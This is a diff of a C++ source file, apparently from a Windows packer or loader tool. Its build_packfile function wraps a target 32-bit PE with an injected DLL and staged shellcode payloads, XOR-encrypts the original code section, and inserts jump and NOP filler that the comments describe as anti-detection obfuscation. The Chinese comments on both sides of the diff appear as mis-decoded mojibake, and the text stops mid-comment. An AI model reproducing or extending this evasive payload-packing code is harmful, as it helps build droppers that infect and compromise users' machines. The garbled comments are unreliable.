@@ -1,4 +1,4 @@
-#define WIN32_LEAN_AND_MEAN
+ï»¿#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include "Lightbone/utils.h"
 #include "Lightbone/api_resolver.h"
@@ -74,41 +74,41 @@ void copy_option_headers(pe_base* source, pe_base* dest)
         = get_nt_headers_32_ptr(source).OptionalHeader.MinorSubsystemVersion;
 }
 /**
- * @brief ¹¹½¨´ò°üÎÄ¼ş
- * 
- * @param target_file_path Ä¿±êÎÄ¼şÂ·¾¶
- * @param dll_path DLLÎÄ¼şÂ·¾¶
- * @param output_file_path Êä³öÎÄ¼şÂ·¾¶
- * @param stage_1_payload µÚÒ»½×¶ÎÓĞĞ§ÔØºÉ
- * @param stage_2_payload µÚ¶ş½×¶ÎÓĞĞ§ÔØºÉ
- * @param config ÅäÖÃÎÄ¼şÂ·¾¶
- * @return true ¹¹½¨³É¹¦
- * @return false ¹¹½¨Ê§°Ü
+ * @brief æ„å»ºæ‰“åŒ…æ–‡ä»¶
+ *
+ * @param target_file_path ç›®æ ‡æ–‡ä»¶è·¯å¾„
+ * @param dll_path DLLæ–‡ä»¶è·¯å¾„
+ * @param output_file_path è¾“å‡ºæ–‡ä»¶è·¯å¾„
+ * @param stage_1_payload ç¬¬ä¸€é˜¶æ®µæœ‰æ•ˆè½½è·
+ * @param stage_2_payload ç¬¬äºŒé˜¶æ®µæœ‰æ•ˆè½½è·
+ * @param config é…ç½®æ–‡ä»¶è·¯å¾„
+ * @return true æ„å»ºæˆåŠŸ
+ * @return false æ„å»ºå¤±è´¥
  */
-bool build_packfile(const std::string& target_file_path, 
-    const std::string& dll_path, 
+bool build_packfile(const std::string& target_file_path,
+    const std::string& dll_path,
     const std::string& output_file_path,
     const std::string& stage_1_payload,
     const std::string& stage_2_payload,
     const std::string& config)
 {
-    // ´ò¿ªÄ¿±êPEÎÄ¼ş
+    // æ‰“å¼€ç›®æ ‡PEæ–‡ä»¶
     std::ifstream pe_file(target_file_path, std::ios::in | std::ios::binary);
     if (!pe_file)
     {
         return false;
     }
-    // ´´½¨PEÎÄ¼ş¶ÔÏó
+    // åˆ›å»ºPEæ–‡ä»¶å¯¹è±¡
     pe_base image(pe_factory::create_pe(pe_file));
-    // ¼ì²éPEÎÄ¼şÀàĞÍÊÇ·ñÎª32Î»
+    // æ£€æŸ¥PEæ–‡ä»¶ç±»å‹æ˜¯å¦ä¸º32ä½
     if (image.get_pe_type() == pe_type_64)
     {
         return false;
     }
-    // ´´½¨ĞÂµÄPEÎÄ¼ş¶ÔÏó
+    // åˆ›å»ºæ–°çš„PEæ–‡ä»¶å¯¹è±¡
     pe_base new_image(pe_properties_32(), image.get_section_alignment());
 
-    // ÉèÖÃPEÎÄ¼şµÄÌØÕ÷ºÍÊôĞÔ
+    // è®¾ç½®PEæ–‡ä»¶çš„ç‰¹å¾å’Œå±æ€§
     new_image.set_characteristics(image.get_characteristics());
     new_image.set_dll_characteristics(image.get_dll_characteristics());
     new_image.set_file_alignment(image.get_file_alignment());
@@ -122,7 +122,7 @@ bool build_packfile(const std::string& target_file_path,
     new_image.set_subsystem(image.get_subsystem());
     new_image.set_time_date_stamp(image.get_time_date_stamp());
 
-    // ¸´ÖÆ¿ÉÑ¡Í·ĞÅÏ¢
+    // å¤åˆ¶å¯é€‰å¤´ä¿¡æ¯
     copy_option_headers(&image, &new_image);
 
     for (unsigned long i = 0; i < image.get_number_of_rvas_and_sizes(); ++i)
@@ -139,7 +139,7 @@ bool build_packfile(const std::string& target_file_path,
         }
     }
 
-    // ¸´ÖÆ½ÚĞÅÏ¢
+    // å¤åˆ¶èŠ‚ä¿¡æ¯
     {
         const section_list& pe_sections = image.get_image_sections();
         for (section_list::const_iterator it = pe_sections.begin(); it != pe_sections.end(); ++it)
@@ -156,26 +156,26 @@ bool build_packfile(const std::string& target_file_path,
         }
     }
 
-    // ÉèÖÃËæ»úÖÖ×Ó
+    // è®¾ç½®éšæœºç§å­
     srand(::GetTickCount());
-    // ´´½¨¼ÓÃÜ´úÂë½Ú
+    // åˆ›å»ºåŠ å¯†ä»£ç èŠ‚
     section crypt_code_section;
     crypt_code_section.get_raw_data().resize(1);
     crypt_code_section.set_name(".mapo");
     crypt_code_section.readable(true);
 
-    //// ¹²ÏíÊı¾İ½á¹¹
+    //// å…±äº«æ•°æ®ç»“æ„
     //share_data_t share = { kShareDateMagicKey,
     //{ 0xE8, 0, 0, 0, 0 },
     //0xE8, 
-    // // ¼õÈ¥ret_opcodeµÄ´óĞ¡,Ò²¾ÍÊÇstage_1_payloadµÄµØÖ·,Ò²¾ÍÊÇcall _loader_entryº¯Êı
+    // // å‡å»ret_opcodeçš„å¤§å°,ä¹Ÿå°±æ˜¯stage_1_payloadçš„åœ°å€,ä¹Ÿå°±æ˜¯call _loader_entryå‡½æ•°
     //sizeof(share_data_t) - offsetof(share_data_t, ret_opcode),
     //0xC3 };
-    // ¹²ÏíÊı¾İ½á¹¹
+    // å…±äº«æ•°æ®ç»“æ„
     share_data_t share = { kShareDateMagicKey };
 
-    // ³õÊ¼»¯ eip_opcode Îª»ìÏı´úÂë
-    memset(share.eip_opcode, 0x90, sizeof(share.eip_opcode)); // Ê¹ÓÃ NOP Ö¸ÁîÌî³ä
+    // åˆå§‹åŒ– eip_opcode ä¸ºæ··æ·†ä»£ç 
+    memset(share.eip_opcode, 0x90, sizeof(share.eip_opcode)); // ä½¿ç”¨ NOP æŒ‡ä»¤å¡«å……
 
     //share_data_t share = { 
     //    kShareDateMagicKey,
@@ -183,10 +183,10 @@ bool build_packfile(const std::string& target_file_path,
     //    0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x44, 0x53, 0x56, 0x57, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58
     //    } 
     //};
-    // ÔÚ»ìÏı´úÂëÖĞÌí¼ÓÒ»Ğ©Ëæ»úĞÔ£¬Ôö¼Ó·´¼ì²âÄÜÁ¦
+    // åœ¨æ··æ·†ä»£ç ä¸­æ·»åŠ ä¸€äº›éšæœºæ€§ï¼Œå¢åŠ åæ£€æµ‹èƒ½åŠ›
     for (size_t i = 0; i < (sizeof(share.eip_opcode) - 5); i += 5) {
-        share.eip_opcode[i] = 0xEB;     // ¶ÌÌø×ªÖ¸Áî
-        share.eip_opcode[i + 1] = 0x03;   // Ìø×ª 3 ×Ö½Ú
+        share.eip_opcode[i] = 0xEB;     // çŸ­è·³è½¬æŒ‡ä»¤
+        share.eip_opcode[i + 1] = 0x03;   // è·³è½¬ 3 å­—èŠ‚
     }
     int i = sizeof(share.eip_opcode) - 6;
     share.eip_opcode[++i] = 0xE8;
@@ -194,80 +194,80 @@ bool build_packfile(const std::string& target_file_path,
     share.eip_opcode[++i] = 0x0;
     share.eip_opcode[++i] = 0x0;
     share.eip_opcode[++i] = 0x0;
-    // ÉèÖÃÆäËû×Ö¶Î
+    // è®¾ç½®å…¶ä»–å­—æ®µ
     share.call_opcode = 0xE8;
-    // µ÷ÊÔ£º´òÓ¡½á¹¹Ìå´óĞ¡ºÍÆ«ÒÆĞÅÏ¢
+    // è°ƒè¯•ï¼šæ‰“å°ç»“æ„ä½“å¤§å°å’Œåç§»ä¿¡æ¯
     /*std::cout << "sizeof(share_data_t): " << sizeof(share_data_t) << std::endl;
     std::cout << "offsetof(share_data_t, ret_opcode): " << offsetof(share_data_t, ret_opcode) << std::endl;*/
 
-    // ÏêÏ¸´òÓ¡½á¹¹Ìå¸÷¸ö×Ö¶ÎµÄÆ«ÒÆºÍ´óĞ¡
-    //std::cout << "ShareData ½á¹¹ÌåÄÚ´æ²¼¾ÖÏêÇé:" << std::endl;
-    //std::cout << "magic Æ«ÒÆ: " << offsetof(share_data_t, magic) 
-    //          << ", ´óĞ¡: " << sizeof(share.magic) << std::endl;
-    //std::cout << "eip_opcode Æ«ÒÆ: " << offsetof(share_data_t, eip_opcode) 
-    //          << ", ´óĞ¡: " << sizeof(share.eip_opcode) << std::endl;
-    //std::cout << "call_opcode Æ«ÒÆ: " << offsetof(share_data_t, call_opcode) 
-    //          << ", ´óĞ¡: " << sizeof(share.call_opcode) << std::endl;
-    //std::cout << "entry_point_dist Æ«ÒÆ: " << offsetof(share_data_t, entry_point_dist) 
-    //          << ", ´óĞ¡: " << sizeof(share.entry_point_dist) << std::endl;
-    //std::cout << "ret_opcode Æ«ÒÆ: " << offsetof(share_data_t, ret_opcode) 
-    //          << ", ´óĞ¡: " << sizeof(share.ret_opcode) << std::endl;
-    //std::cout << "stub_rva Æ«ÒÆ: " << offsetof(share_data_t, stub_rva) 
-    //          << ", ´óĞ¡: " << sizeof(share.stub_rva) << std::endl;
-    //std::cout << "stub_size Æ«ÒÆ: " << offsetof(share_data_t, stub_size) 
-    //          << ", ´óĞ¡: " << sizeof(share.stub_size) << std::endl;
-    //std::cout << "stub_entry_rva Æ«ÒÆ: " << offsetof(share_data_t, stub_entry_rva) 
-    //          << ", ´óĞ¡: " << sizeof(share.stub_entry_rva) << std::endl;
-    //std::cout << "cfg_size Æ«ÒÆ: " << offsetof(share_data_t, cfg_size) 
-    //          << ", ´óĞ¡: " << sizeof(share.cfg_size) << std::endl;
-    //std::cout << "cfg Æ«ÒÆ: " << offsetof(share_data_t, cfg) 
-    //          << ", ´óĞ¡: " << sizeof(share.cfg) << std::endl;
-    //std::cout << "crypt_code_rva Æ«ÒÆ: " << offsetof(share_data_t, crypt_code_rva) 
-    //          << ", ´óĞ¡: " << sizeof(share.crypt_code_rva) << std::endl;
-    //std::cout << "crypt_code_size Æ«ÒÆ: " << offsetof(share_data_t, crypt_code_size) 
-    //          << ", ´óĞ¡: " << sizeof(share.crypt_code_size) << std::endl;
-    //std::cout << "oep Æ«ÒÆ: " << offsetof(share_data_t, oep) 
-    //          << ", ´óĞ¡: " << sizeof(share.oep) << std::endl;
-    //std::cout << "xor_key Æ«ÒÆ: " << offsetof(share_data_t, xor_key) 
-    //          << ", ´óĞ¡: " << sizeof(share.xor_key) << std::endl;
-    //std::cout << "origin_image_base Æ«ÒÆ: " << offsetof(share_data_t, origin_image_base) 
-    //          << ", ´óĞ¡: " << sizeof(share.origin_image_base) << std::endl;
-    //std::cout << "stage Æ«ÒÆ: " << offsetof(share_data_t, stage) 
-    //          << ", ´óĞ¡: " << sizeof(share.stage) << std::endl;
+    // è¯¦ç»†æ‰“å°ç»“æ„ä½“å„ä¸ªå­—æ®µçš„åç§»å’Œå¤§å°
+    //std::cout << "ShareData ç»“æ„ä½“å†…å­˜å¸ƒå±€è¯¦æƒ…:" << std::endl;
+    //std::cout << "magic åç§»: " << offsetof(share_data_t, magic) 
+    //          << ", å¤§å°: " << sizeof(share.magic) << std::endl;
+    //std::cout << "eip_opcode åç§»: " << offsetof(share_data_t, eip_opcode) 
+    //          << ", å¤§å°: " << sizeof(share.eip_opcode) << std::endl;
+    //std::cout << "call_opcode åç§»: " << offsetof(share_data_t, call_opcode) 
+    //          << ", å¤§å°: " << sizeof(share.call_opcode) << std::endl;
+    //std::cout << "entry_point_dist åç§»: " << offsetof(share_data_t, entry_point_dist) 
+    //          << ", å¤§å°: " << sizeof(share.entry_point_dist) << std::endl;
+    //std::cout << "ret_opcode åç§»: " << offsetof(share_data_t, ret_opcode) 
+    //          << ", å¤§å°: " << sizeof(share.ret_opcode) << std::endl;
+    //std::cout << "stub_rva åç§»: " << offsetof(share_data_t, stub_rva) 
+    //          << ", å¤§å°: " << sizeof(share.stub_rva) << std::endl;
+    //std::cout << "stub_size åç§»: " << offsetof(share_data_t, stub_size) 
+    //          << ", å¤§å°: " << sizeof(share.stub_size) << std::endl;
+    //std::cout << "stub_entry_rva åç§»: " << offsetof(share_data_t, stub_entry_rva) 
+    //          << ", å¤§å°: " << sizeof(share.stub_entry_rva) << std::endl;
+    //std::cout << "cfg_size åç§»: " << offsetof(share_data_t, cfg_size) 
+    //          << ", å¤§å°: " << sizeof(share.cfg_size) << std::endl;
+    //std::cout << "cfg åç§»: " << offsetof(share_data_t, cfg) 
+    //          << ", å¤§å°: " << sizeof(share.cfg) << std::endl;
+    //std::cout << "crypt_code_rva åç§»: " << offsetof(share_data_t, crypt_code_rva) 
+    //          << ", å¤§å°: " << sizeof(share.crypt_code_rva) << std::endl;
+    //std::cout << "crypt_code_size åç§»: " << offsetof(share_data_t, crypt_code_size) 
+    //          << ", å¤§å°: " << sizeof(share.crypt_code_size) << std::endl;
+    //std::cout << "oep åç§»: " << offsetof(share_data_t, oep) 
+    //          << ", å¤§å°: " << sizeof(share.oep) << std::endl;
+    //std::cout << "xor_key åç§»: " << offsetof(share_data_t, xor_key) 
+    //          << ", å¤§å°: " << sizeof(share.xor_key) << std::endl;
+    //std::cout << "origin_image_base åç§»: " << offsetof(share_data_t, origin_image_base) 
+    //          << ", å¤§å°: " << sizeof(share.origin_image_base) << std::endl;
+    //std::cout << "stage åç§»: " << offsetof(share_data_t, stage) 
+    //          << ", å¤§å°: " << sizeof(share.stage) << std::endl;
 
-    // ¼ÆËã stage_1_payload (loader_entry) µÄ¾«È·µØÖ·
+    // è®¡ç®— stage_1_payload (loader_entry) çš„ç²¾ç¡®åœ°å€
     share.entry_point_dist = sizeof(share_data_t) - offsetof(share_data_t, ret_opcode);
 
-    //std::cout << "loader_entry µØÖ·¼ÆËãÏêÇé:" << std::endl;
-    //std::cout << "¼ÆËã¹«Ê½: sizeof(share_data_t) - offsetof(ret_opcode) = "
+    //std::cout << "loader_entry åœ°å€è®¡ç®—è¯¦æƒ…:" << std::endl;
+    //std::cout << "è®¡ç®—å…¬å¼: sizeof(share_data_t) - offsetof(ret_opcode) = "
     //    << sizeof(share_data_t) << " - "
     //    << offsetof(share_data_t, ret_opcode) << std::endl;
-    //std::cout << "¼ÆËã½á¹û: " << share.entry_point_dist << std::endl;
+    //std::cout << "è®¡ç®—ç»“æœ: " << share.entry_point_dist << std::endl;
     share.ret_opcode = 0xC3;
 
     share.stage = 0;
-    // ³õÊ¼»¯²¢Ìî³äshellcode
+    // åˆå§‹åŒ–å¹¶å¡«å……shellcode
     std::string shellcode;
     shellcode.resize(sizeof(share) + stage_1_payload.size() + stage_2_payload.size());
     share.oep = image.get_ep();
     share.xor_key = rand();
     share.origin_image_base = image.get_image_base_64();
     memset(share.cfg, 0, sizeof(share.cfg));
-    // ¼ÓÔØÅäÖÃÎÄ¼ş
+    // åŠ è½½é…ç½®æ–‡ä»¶
     ProtocolCFGLoader cfg;
     auto json_str = Packer::load_file(config);
     cfg.json = json::parse(json_str);
     auto cfg_bin = cfg.dump();
     share.cfg_size = cfg_bin.size();
-    // ¼ì²éÅäÖÃÎÄ¼ş´óĞ¡ÊÇ·ñ³¬¹ıÏŞÖÆ
-    if(cfg_bin.size() > sizeof(share.cfg))
+    // æ£€æŸ¥é…ç½®æ–‡ä»¶å¤§å°æ˜¯å¦è¶…è¿‡é™åˆ¶
+    if (cfg_bin.size() > sizeof(share.cfg))
     {
         std::cerr << "cfg too big" << std::endl;
         return false;
     }
-    // ¸´ÖÆÅäÖÃÎÄ¼şÊı¾İµ½¹²ÏíÊı¾İ½á¹¹
+    // å¤åˆ¶é…ç½®æ–‡ä»¶æ•°æ®åˆ°å…±äº«æ•°æ®ç»“æ„
     memcpy(share.cfg, cfg_bin.data(), (std::min)(cfg_bin.size(), sizeof(share.cfg)));
-    // ÖØ¶¨Î»ĞÅÏ¢¼ÇÔØ
+    // é‡å®šä½ä¿¡æ¯è®°è½½
     relocation_table_list relocs_tables(get_relocations(image));
     std::map<uint32_t, relocation_table> new_relocs_tables;
     std::vector<reloc_info_t> relocs;
@@ -298,14 +298,14 @@ bool build_packfile(const std::string& target_file_path,
     {
         relocs_tables.push_back(new_relocs_tables_itor.second);
     }
-    // ´´½¨ÖØ¶¨Î»½Ú
+    // åˆ›å»ºé‡å®šä½èŠ‚
     section new_relocs;
     new_relocs.get_raw_data().resize(1);
     new_relocs.set_name(".reloc");
     new_relocs.readable(true);
     section& attached_section = new_image.add_section(new_relocs);
     rebuild_relocations(new_image, relocs_tables, attached_section);
-    // ´´½¨×ÊÔ´½Ú
+    // åˆ›å»ºèµ„æºèŠ‚
     resource_directory root(get_resources(image));
     section rsrc;
     rsrc.set_name(".rsrc");
@@ -315,7 +315,7 @@ bool build_packfile(const std::string& target_file_path,
     section& attach_rsrc = new_image.add_section(rsrc);
     rebuild_resources(new_image, root, attach_rsrc);
 
-    // ¼ÓÔØDLLÎÄ¼ş
+    // åŠ è½½DLLæ–‡ä»¶
     std::ifstream dll_file(dll_path, std::ios::in | std::ios::binary);
     dll_file.seekg(0, dll_file.end);
     const size_t bind_dll_size = dll_file.tellg();
@@ -337,7 +337,7 @@ bool build_packfile(const std::string& target_file_path,
         n++;
     }
     const size_t text_code_offset = offsetof(crypt_code_t, reloc) + relocs.size() * sizeof(reloc_info_t);
-	memcpy(crypt_code.get() + text_code_offset, code_section.get_raw_data().data(), text_code_size);
+    memcpy(crypt_code.get() + text_code_offset, code_section.get_raw_data().data(), text_code_size);
 
     if (bind_dll_size)
     {
@@ -352,34 +352,34 @@ bool build_packfile(const std::string& target_file_path,
     share.crypt_code_size = bind_crypt_code_section.get_raw_data().size();
 
     /*
-    ÕâĞĞC++´úÂëÖ´ĞĞÁËÒ»¸öÌØ¶¨µÄ¼ÆËã£¬ÓÃÓÚÉú³ÉÒ»¸öÃûÎª `random` µÄÕûĞÍ±äÁ¿Öµ¡£Õâ¸öÖµ»ùÓÚÁ½¸ö²»Í¬Êı¾İ´óĞ¡µÄ¼ÆËã£º`shellcode.size()` ºÍ 
-    `code_section.get_raw_data().size()`¡£ÏÂÃæÊÇ¶ÔÕâĞĞ´úÂëµÄÏêÏ¸½âÊÍ£º
+    è¿™è¡ŒC++ä»£ç æ‰§è¡Œäº†ä¸€ä¸ªç‰¹å®šçš„è®¡ç®—ï¼Œç”¨äºç”Ÿæˆä¸€ä¸ªåä¸º `random` çš„æ•´å‹å˜é‡å€¼ã€‚è¿™ä¸ªå€¼åŸºäºä¸¤ä¸ªä¸åŒæ•°æ®å¤§å°çš„è®¡ç®—ï¼š`shellcode.size()` å’Œ
+    `code_section.get_raw_data().size()`ã€‚ä¸‹é¢æ˜¯å¯¹è¿™è¡Œä»£ç çš„è¯¦ç»†è§£é‡Šï¼š
 
     1. **`shellcode.size()`**:
-       - Õâ²¿·Öµ÷ÓÃÁË `shellcode` ¶ÔÏóµÄ `size()` ³ÉÔ±º¯Êı¡£`shellcode` ºÜ¿ÉÄÜÊÇÒ»¸ö´æ´¢ÁËÄ³ÖÖÊı¾İ£¨±ÈÈçshellcode£¬¼´Ò»¶ÎÓÃÓÚÔÚÄ¿±êÏµÍ³
-       ÉÏÖ´ĞĞÌØ¶¨ÈÎÎñµÄ»úÆ÷Âë£©µÄÈİÆ÷£¨Èç `std::vector`¡¢`std::string` µÈ£©¡£`size()` º¯Êı·µ»ØÈİÆ÷ÖĞÔªËØµÄÊıÁ¿£¬¶ÔÓÚ `std::string` »ò×Ö
-       ½ÚÊı×éÀ´Ëµ£¬ÕâÍ¨³£ÒâÎ¶×ÅÊı¾İµÄ×Ö½ÚÊı¡£
+       - è¿™éƒ¨åˆ†è°ƒç”¨äº† `shellcode` å¯¹è±¡çš„ `size()` æˆå‘˜å‡½æ•°ã€‚`shellcode` å¾ˆå¯èƒ½æ˜¯ä¸€ä¸ªå­˜å‚¨äº†æŸç§æ•°æ®ï¼ˆæ¯”å¦‚shellcodeï¼Œå³ä¸€æ®µç”¨äºåœ¨ç›®æ ‡ç³»ç»Ÿ
+       ä¸Šæ‰§è¡Œç‰¹å®šä»»åŠ¡çš„æœºå™¨ç ï¼‰çš„å®¹å™¨ï¼ˆå¦‚ `std::vector`ã€`std::string` ç­‰ï¼‰ã€‚`size()` å‡½æ•°è¿”å›å®¹å™¨ä¸­å…ƒç´ çš„æ•°é‡ï¼Œå¯¹äº `std::string` æˆ–å­—
+       èŠ‚æ•°ç»„æ¥è¯´ï¼Œè¿™é€šå¸¸æ„å‘³ç€æ•°æ®çš„å­—èŠ‚æ•°ã€‚
 
     2. **`code_section.get_raw_data().size()`**:
-       - ÕâÀï£¬`code_section` ËÆºõÊÇÒ»¸ö¶ÔÏó£¬ËüÓĞÒ»¸ö³ÉÔ±º¯Êı `get_raw_data()`¡£Õâ¸öº¯Êı·µ»ØÒ»¸öÈİÆ÷»òÀàËÆµÄÊı¾İ½á¹¹£¬¸Ã½á¹¹°üº¬ÁË
-       `code_section` µÄÔ­Ê¼Êı¾İ¡£È»ºó£¬¶ÔÕâ¸ö·µ»ØµÄÊı¾İ½á¹¹µ÷ÓÃÁË `size()` º¯Êı£¬ÒÔ»ñÈ¡Æä´óĞ¡£¨¼´ÔªËØµÄÊıÁ¿»ò×Ö½ÚÊı£©¡£
+       - è¿™é‡Œï¼Œ`code_section` ä¼¼ä¹æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒæœ‰ä¸€ä¸ªæˆå‘˜å‡½æ•° `get_raw_data()`ã€‚è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªå®¹å™¨æˆ–ç±»ä¼¼çš„æ•°æ®ç»“æ„ï¼Œè¯¥ç»“æ„åŒ…å«äº†
+       `code_section` çš„åŸå§‹æ•°æ®ã€‚ç„¶åï¼Œå¯¹è¿™ä¸ªè¿”å›çš„æ•°æ®ç»“æ„è°ƒç”¨äº† `size()` å‡½æ•°ï¼Œä»¥è·å–å…¶å¤§å°ï¼ˆå³å…ƒç´ çš„æ•°é‡æˆ–å­—èŠ‚æ•°ï¼‰ã€‚
 
     3. **`(rand() % (code_section.get_raw_data().size() - shellcode.size()))`**:
-       - `rand()` ÊÇÒ»¸ö±ê×¼¿âº¯Êı£¬ÓÃÓÚÉú³ÉÒ»¸öÎ±Ëæ»úÊı¡£Õâ¸öËæ»úÊıÍ¨³£ÊÇÒ»¸öÏà¶Ô½Ï´óµÄÕûÊı¡£
-       - `%` ÊÇÈ¡Ä£ÔËËã·û£¬ÓÃÓÚ¼ÆËã×ó²àÊı³ıÒÔÓÒ²àÊıµÄÓàÊı¡£ÔÚÕâÀï£¬ËüÓÃÓÚÉú³ÉÒ»¸öÔÚ `0` µ½
-       `(code_section.get_raw_data().size() - shellcode.size() - 1)` ·¶Î§ÄÚµÄËæ»úÕûÊı¡£ÕâÒâÎ¶×Å£¬Èç¹û `code_section` µÄÊı¾İ´óĞ¡Ô¶´óÓÚ
-       `shellcode` µÄ´óĞ¡£¬Õâ¸ö±í´ïÊ½½«Éú³ÉÒ»¸öÏà¶Ô½ÏĞ¡µÄËæ»úÊı¡£
+       - `rand()` æ˜¯ä¸€ä¸ªæ ‡å‡†åº“å‡½æ•°ï¼Œç”¨äºç”Ÿæˆä¸€ä¸ªä¼ªéšæœºæ•°ã€‚è¿™ä¸ªéšæœºæ•°é€šå¸¸æ˜¯ä¸€ä¸ªç›¸å¯¹è¾ƒå¤§çš„æ•´æ•°ã€‚
+       - `%` æ˜¯å–æ¨¡è¿ç®—ç¬¦ï¼Œç”¨äºè®¡ç®—å·¦ä¾§æ•°é™¤ä»¥å³ä¾§æ•°çš„ä½™æ•°ã€‚åœ¨è¿™é‡Œï¼Œå®ƒç”¨äºç”Ÿæˆä¸€ä¸ªåœ¨ `0` åˆ°
+       `(code_section.get_raw_data().size() - shellcode.size() - 1)` èŒƒå›´å†…çš„éšæœºæ•´æ•°ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœ `code_section` çš„æ•°æ®å¤§å°è¿œå¤§äº
+       `shellcode` çš„å¤§å°ï¼Œè¿™ä¸ªè¡¨è¾¾å¼å°†ç”Ÿæˆä¸€ä¸ªç›¸å¯¹è¾ƒå°çš„éšæœºæ•°ã€‚
 
     4. **`shellcode.size() + ...`**:
-       - ×îºó£¬½« `shellcode.size()` µÄÖµÓëÉÏÊöËæ»úÊıÏà¼Ó¡£ÕâÑù£¬`random` µÄÖµ½«ÊÇÒ»¸öÖÁÉÙµÈÓÚ `shellcode.size()` µÄÊı£¬ÇÒ×î´ó²»³¬¹ı
-       `code_section.get_raw_data().size()`£¨Èç¹û `shellcode.size()` ²»ÎªÁã£©¡£
+       - æœ€åï¼Œå°† `shellcode.size()` çš„å€¼ä¸ä¸Šè¿°éšæœºæ•°ç›¸åŠ ã€‚è¿™æ ·ï¼Œ`random` çš„å€¼å°†æ˜¯ä¸€ä¸ªè‡³å°‘ç­‰äº `shellcode.size()` çš„æ•°ï¼Œä¸”æœ€å¤§ä¸è¶…è¿‡
+       `code_section.get_raw_data().size()`ï¼ˆå¦‚æœ `shellcode.size()` ä¸ä¸ºé›¶ï¼‰ã€‚
 
-    **Ä¿µÄºÍÓÃÍ¾**£º
+    **ç›®çš„å’Œç”¨é€”**ï¼š
 
-    ÕâĞĞ´úÂëµÄÄ¿µÄ¿ÉÄÜÊÇÎªÁËÔÚÒ»¸ö¸ü´óµÄÊı¾İ¿é£¨`code_section.get_raw_data()`£©ÖĞ£¬»ùÓÚ `shellcode` µÄ´óĞ¡£¬Ëæ»úÑ¡ÔñÒ»¸öÆğÊ¼Î»ÖÃÀ´²åÈë
-    »ò²Ù×÷ `shellcode`¡£Í¨¹ıÈ·±£ `random` µÄÖµÖÁÉÙµÈÓÚ `shellcode.size()`£¬´úÂë¿ÉÄÜÖ¼ÔÚ±ÜÃâÔÚÑ¡ÔñµÄÎ»ÖÃÃ»ÓĞ×ã¹»µÄ¿Õ¼äÀ´ÈİÄÉ `shellcode`¡£
-    È»¶ø£¬ÕâÖÖ¼ÆËã·½Ê½Ò²¼ÙÉè `code_section.get_raw_data().size()` ´óÓÚ»òµÈÓÚ `2 * shellcode.size()`£¨ÎªÁË´¦Àí `rand()` ¿ÉÄÜ²úÉúµÄÁãÖµÇé
-    ¿ö£¬¾¡¹ÜÓÉÓÚÈ¡Ä£ÔËËã£¬ÁãÖµÊµ¼ÊÉÏ²»»áÖ±½Ó²úÉú£¬µ«½Ó½üÁãµÄĞ¡ÖµÈÔ¿ÉÄÜµ¼ÖÂ¿Õ¼ä²»×ãµÄÎÊÌâ£¬³ı·ÇÓĞ¶îÍâµÄ¼ì²é£©¡£
+    è¿™è¡Œä»£ç çš„ç›®çš„å¯èƒ½æ˜¯ä¸ºäº†åœ¨ä¸€ä¸ªæ›´å¤§çš„æ•°æ®å—ï¼ˆ`code_section.get_raw_data()`ï¼‰ä¸­ï¼ŒåŸºäº `shellcode` çš„å¤§å°ï¼Œéšæœºé€‰æ‹©ä¸€ä¸ªèµ·å§‹ä½ç½®æ¥æ’å…¥
+    æˆ–æ“ä½œ `shellcode`ã€‚é€šè¿‡ç¡®ä¿ `random` çš„å€¼è‡³å°‘ç­‰äº `shellcode.size()`ï¼Œä»£ç å¯èƒ½æ—¨åœ¨é¿å…åœ¨é€‰æ‹©çš„ä½ç½®æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥å®¹çº³ `shellcode`ã€‚
+    ç„¶è€Œï¼Œè¿™ç§è®¡ç®—æ–¹å¼ä¹Ÿå‡è®¾ `code_section.get_raw_data().size()` å¤§äºæˆ–ç­‰äº `2 * shellcode.size()`ï¼ˆä¸ºäº†å¤„ç† `rand()` å¯èƒ½äº§ç”Ÿçš„é›¶å€¼æƒ…
